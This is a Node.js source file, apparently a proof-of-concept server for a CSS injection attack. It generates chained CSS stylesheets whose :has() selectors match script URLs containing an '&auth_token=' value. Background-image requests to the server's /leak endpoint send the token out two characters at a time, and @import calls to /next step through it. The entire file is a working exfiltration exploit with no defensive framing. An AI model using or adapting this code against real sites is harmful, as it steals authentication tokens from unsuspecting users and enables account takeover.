const http = require('http');
const url = require('url');
const port = 3000;

const HOSTNAME = "http://localhost:3000";
const CHARS = '0123456789abcdefghijklmnopqrstuvwxyz-'.split('');

const DEBUG = false;

var prefix = "&auth_token=";
var leaked_data = "";

var pendingResponse = null;
var stop = false,
    n = 0;

const requestHandler = (request, response) => {
    let req = url.parse(request.url, true);
    log('\treq: %s', request.url);

    if (stop) {
        return response.end();
    }

    if (req.pathname === '/start') {
        genResponse(response);
    } else if (req.pathname === '/leak') {
        response.end();

        if (req.query.chars) {
            leaked_data += req.query.chars;

            if (pendingResponse) {
                genResponse(pendingResponse);
                pendingResponse = null;
            }

            if (leaked_data.length === 36) {
                process.stdout.write('\n');
                process.exit(1);
            }
        }
    } else if (req.pathname === '/next') {
        pendingResponse = response;
    } else {
        response.end();
    }
};

const genResponse = (response) => {
    process.stdout.clearLine(0);
    process.stdout.cursorTo(0);
    process.stdout.write(`Leaked: ${leaked_data}`);

    let css = `@import url(${HOSTNAME}/next?${Math.random()});` +
        CHARS.map(e => 
            CHARS.map(f => 
                `html:has(script[src*="${prefix + leaked_data}${e}${f}"]) div${':is(div)'.repeat(n + 1)} {
                    background: url(${HOSTNAME}/leak?chars=${e}${f}&cb=${Math.random()}) !important; 
                    display: block !important;
                }`
            )
        ).flat().join('');

    response.writeHead(200, { 'Content-Type': 'text/css' });
    response.write(css);
    response.end();

    n++;
};

const server = http.createServer(requestHandler);

server.listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }

    console.log('[+] Server is listening on %d', port);
});

function log() {
    if (DEBUG) console.log.apply(console, arguments);
}